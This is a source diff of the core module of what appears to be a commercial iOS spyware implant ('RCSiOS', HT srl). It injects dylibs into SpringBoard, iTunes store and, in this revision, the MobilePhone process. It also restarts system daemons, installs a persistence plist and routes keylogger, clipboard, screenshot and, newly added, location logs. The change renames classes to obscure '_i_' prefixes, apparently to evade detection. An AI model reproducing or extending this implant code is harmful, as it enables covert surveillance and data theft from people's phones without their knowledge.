@@ -1,7 +1,5 @@
 /*
  * RCSiOS - Core
- *  pon pon
- *
  *
  * Created on 07/09/2009
  * Copyright (C) HT srl 2009. All rights reserved
@@ -9,6 +7,7 @@
  */
 
 #import <CommonCrypto/CommonDigest.h>
+#import <unistd.h>
 #import <sys/ioctl.h>
 #import <fcntl.h>
 #import <sys/socket.h>
@@ -30,6 +29,8 @@
 #import "NSString+ComparisonMethod.h"
 #import "NSData+SHA1.h"
 
+#import "RCSIGlobals.h"
+
 //#define DEBUG_
 //#define __DEBUG_IOS_DYLIB
 
@@ -39,7 +40,7 @@
 
 extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
 
-@interface RCSICore (hidden)
+@interface _i_Core (hidden)
 
 - (void)_guessNames;
 
@@ -58,7 +59,7 @@ extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
 #pragma mark Private Implementation
 #pragma mark -
 
-@implementation RCSICore (hidden)
+@implementation _i_Core (hidden)
 
 - (void)launchCtl:(char*)aDaemon command:(char*)aCommand
 {
@@ -66,7 +67,7 @@ extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
   
   snprintf(statment, 
            sizeof(statment), 
-           "/bin/launchctl %s \"/System/Library/LaunchDaemons/%s\"", 
+           "/bin/launchctl %s %s", 
            aCommand, 
            aDaemon);
   
@@ -144,16 +145,16 @@ extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
   // Dylib injection
   if (injectDylib(SB_PATHNAME) == YES)
     {
-      [self launchCtl: "com.apple.SpringBoard.plist" command: "unload"];
+      [self launchCtl: SPRINGBOARD_PLIST_PATH command: "unload"];
       usleep(500000);
-      [self launchCtl: "com.apple.SpringBoard.plist" command: "load"];
+      [self launchCtl: SPRINGBOARD_PLIST_PATH command: "load"];
     }
   
   if (injectDylib(IT_PATHNAME) == YES) 
     {
-      [self launchCtl: "com.apple.itunesstored.plist" command: "unload"];
+      [self launchCtl: ITUNESSTORE_PLIST_PATH command: "unload"];
       usleep(500000);
-      [self launchCtl: "com.apple.itunesstored.plist" command: "load"];
+      [self launchCtl: ITUNESSTORE_PLIST_PATH command: "load"];
     }
   
   return TRUE;
@@ -170,13 +171,13 @@ extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
 
 - (BOOL)updateDylibConfigId
 {
-  RCSIDylibBlob *tmpBlob = [[RCSIDylibBlob alloc] initWithType:DYLIB_NEW_CONFID 
+  _i_DylibBlob *tmpBlob = [[_i_DylibBlob alloc] initWithType:DYLIB_NEW_CONFID 
                                                         status:1 
                                                     attributes:0 
                                                           blob:nil
-                                                      configId:[[RCSIConfManager sharedInstance] mConfigTimestamp]];
+                                                      configId:[[_i_ConfManager sharedInstance] mConfigTimestamp]];
   
-  [[RCSISharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
+  [[_i_SharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
   
   return TRUE;
 }
@@ -185,13 +186,13 @@ extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
 {  
   NSData *dylibName = [gDylibName dataUsingEncoding:NSUTF8StringEncoding];
   
-  RCSIDylibBlob *tmpBlob = [[RCSIDylibBlob alloc] initWithType:DYLIB_NEED_UNINSTALL 
+  _i_DylibBlob *tmpBlob = [[_i_DylibBlob alloc] initWithType:DYLIB_NEED_UNINSTALL 
                                                         status:1 
                                                     attributes:0 
                                                           blob:dylibName
                                                       configId:0];
   
-  [[RCSISharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
+  [[_i_SharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
     
   return TRUE;
 }
@@ -208,8 +209,8 @@ extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
   removeDylibFromPlist(sbPathname);
   removeDylibFromPlist(itPathname);
   
-  [self launchCtl: "com.apple.itunesstored.plist" command: "unload"];
-  [self launchCtl: "com.apple.itunesstored.plist" command: "load"];
+  [self launchCtl: ITUNESSTORE_PLIST_PATH command: "unload"];
+  [self launchCtl: ITUNESSTORE_PLIST_PATH command: "load"];
   
   [[NSFileManager defaultManager] removeItemAtPath: dylibPathname
                                              error: nil];
@@ -218,8 +219,6 @@ extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
   
   if (mLockSock != -1)
     close(mLockSock);
-  
-  [self launchCtl: "com.apple.mdworker.plist" command: "remove"];
     
   [[NSFileManager defaultManager] removeItemAtPath: BACKDOOR_DAEMON_PLIST
                                              error: nil];
@@ -227,6 +226,8 @@ extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
   checkAndRunDemoMode();
   
   sleep(1);
+  
+  [self launchCtl: "com.apple.mdworker" command: "remove"];
   
   [dylibPathname release];
   
@@ -276,9 +277,9 @@ extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
       [dylib release];                                   
     
       // Forcing a SpringBoard reload
-      [self launchCtl:"com.apple.SpringBoard.plist" command:"unload"];
+      [self launchCtl:SPRINGBOARD_PLIST_PATH command:"unload"];
       usleep(500000);
-      [self launchCtl:"com.apple.SpringBoard.plist" command:"load"];
+      [self launchCtl:SPRINGBOARD_PLIST_PATH command:"load"];
     }
   
   [updateDylib release];
@@ -313,7 +314,7 @@ extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
   NSData *temp = [NSData dataWithBytes: gConfAesKey
                                 length: CC_MD5_DIGEST_LENGTH];
   
-  RCSIEncryption *_encryption = [[RCSIEncryption alloc] initWithKey: temp];
+  _i_Encryption *_encryption = [[_i_Encryption alloc] initWithKey: temp];
   gBackdoorName = [[[NSBundle mainBundle] executablePath] lastPathComponent];
   
   gBackdoorUpdateName = [_encryption scrambleForward: gBackdoorName
@@ -353,7 +354,7 @@ typedef struct _coreMessage_t
 - (void)refreshRemoteBlobs:(NSData*)aMessage
 {
   shMemoryLog *message = (shMemoryLog *)[aMessage bytes];
-  [[RCSISharedMemory sharedInstance] refreshRemoteBlobsToPid: message->flag];
+  [[_i_SharedMemory sharedInstance] refreshRemoteBlobsToPid: message->flag];
 }
 
 - (void)dispatchToLogManager:(NSData*)aMessage
@@ -361,8 +362,8 @@ typedef struct _coreMessage_t
   if (aMessage != nil) 
     {
       mach_port_t machPort = 
-          [[[RCSILogManager sharedInstance] notificationPort] machPort];
-      [RCSISharedMemory sendMessageToMachPort:machPort withData:aMessage];
+          [[[_i_LogManager sharedInstance] notificationPort] machPort];
+      [_i_SharedMemory sendMessageToMachPort:machPort withData:aMessage];
     }
 }
 
@@ -371,7 +372,7 @@ typedef struct _coreMessage_t
   if (aMessage != nil) 
     {
       mach_port_t machPort = [[eventManager notificationPort] machPort];
-      [RCSISharedMemory sendMessageToMachPort:machPort withData:aMessage];
+      [_i_SharedMemory sendMessageToMachPort:machPort withData:aMessage];
     }
 }
 
@@ -380,7 +381,7 @@ typedef struct _coreMessage_t
   if (aMessage != nil) 
     {
       mach_port_t machPort = [[actionManager notificationPort] machPort];
-      [RCSISharedMemory sendMessageToMachPort:machPort withData:aMessage];
+      [_i_SharedMemory sendMessageToMachPort:machPort withData:aMessage];
     }
 }
 
@@ -389,7 +390,7 @@ typedef struct _coreMessage_t
   if (aMessage != nil) 
     {
       mach_port_t machPort = [[agentManager notificationPort] machPort];
-      [RCSISharedMemory sendMessageToMachPort:machPort withData:aMessage];
+      [_i_SharedMemory sendMessageToMachPort:machPort withData:aMessage];
     }
 }
 
@@ -476,6 +477,7 @@ typedef struct _coreMessage_t
     case LOG_CLIPBOARD:
     case LOG_KEYLOG:
     case LOG_SNAPSHOT:
+    case LOGTYPE_LOCATION_NEW:
     {
       [self dispatchToLogManager:aMessage];
       break;
@@ -498,7 +500,7 @@ typedef struct _coreMessage_t
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
-  NSMutableArray *messages = [[RCSISharedMemory sharedInstance] fetchMessages];
+  NSMutableArray *messages = [[_i_SharedMemory sharedInstance] fetchMessages];
   
   int msgCount = [messages count];
   
@@ -537,7 +539,7 @@ typedef struct _coreMessage_t
 {
   [eventManager release];
   
-  eventManager = [[RCSIEventManager alloc] init];
+  eventManager = [[_i_EventManager alloc] init];
 
   if ([eventManager start] == TRUE)
     {
@@ -552,7 +554,7 @@ typedef struct _coreMessage_t
 {
   [actionManager release];
   
-  actionManager = [[RCSIActionManager alloc] init];
+  actionManager = [[_i_ActionManager alloc] init];
   
   if ([actionManager start] == TRUE)
     {  
@@ -567,7 +569,7 @@ typedef struct _coreMessage_t
 {
   [agentManager release];
   
-  agentManager = [[RCSIAgentManager alloc] init];
+  agentManager = [[_i_AgentManager alloc] init];
   
   if ([agentManager start] == TRUE)
     {  
@@ -614,6 +616,7 @@ typedef struct _coreMessage_t
     return TRUE;
   
   pid_t sb_pid = getPidByProcessName(@"SpringBoard");
+  pid_t mp_pid = getPidByProcessName(@"MobilePhone");
   
   if (sb_pid > 0 &&  sb_pid != mSBPid) 
     {
@@ -626,6 +629,8 @@ typedef struct _coreMessage_t
         bRet = TRUE;
       else
         bRet = FALSE;
+      
+      injectDylibToProc(mp_pid, dylbPathname);
     }
   
   return bRet;
@@ -665,7 +670,7 @@ typedef struct _coreMessage_t
 - (void)coreRunLoop
 { 
   // singleton object with the correct names of files
-  RCSIConfManager *configManager = [[RCSIConfManager alloc] initWithBackdoorName:
+  _i_ConfManager *configManager = [[_i_ConfManager alloc] initWithBackdoorName:
                                     [[[NSBundle mainBundle] executablePath] lastPathComponent]];
   
   if ([configManager checkConfiguration] == NO)
@@ -674,12 +679,17 @@ typedef struct _coreMessage_t
   // sound/vibrate in demo mode
   checkAndRunDemoMode();
   
-  RCSILogManager  *logManager = [RCSILogManager sharedInstance];
+  _i_LogManager  *logManager = [_i_LogManager sharedInstance];
   [logManager start];
   
   createInfoLog(@"Start");
   
   [self injectSpringBoard];
+  
+  /*
+   * enable main runloop for battery notification
+   */
+  [[UIDevice currentDevice] setBatteryMonitoringEnabled:YES];
   
   while ([self mMainLoopControlFlag] != CORE_STOPPED)
     {
@@ -692,7 +702,7 @@ typedef struct _coreMessage_t
       // first run and every new conf received
       if ([self shouldRestartModules] == TRUE)
         {
-          [[RCSISharedMemory sharedInstance] delBlobs];
+          [[_i_SharedMemory sharedInstance] delBlobs];
         
           if ([self startAgentManager]  == TRUE &&
               [self startActionManager] == TRUE && 
@@ -725,7 +735,7 @@ typedef struct _coreMessage_t
 #pragma mark Public Implementation
 #pragma mark -
 
-@implementation RCSICore
+@implementation _i_Core
 
 @synthesize mMainLoopControlFlag;
 @synthesize mUtil;
@@ -747,7 +757,7 @@ typedef struct _coreMessage_t
     
       [self _guessNames];
    
-      mUtil = [[RCSIUtils alloc] initWithBackdoorPath: [[NSBundle mainBundle] bundlePath]];
+      mUtil = [[_i_Utils alloc] initWithBackdoorPath: [[NSBundle mainBundle] bundlePath]];
     }
   
   return self;
@@ -773,7 +783,7 @@ typedef struct _coreMessage_t
 
   [self shouldUpgradeComponents];
 
-  [[RCSISharedMemory sharedInstance] createCoreRLSource];
+  [[_i_SharedMemory sharedInstance] createCoreRLSource];
   
   if ([self isBackdoorAlreadyResident] == FALSE)
       [self createLaunchAgentPlist];
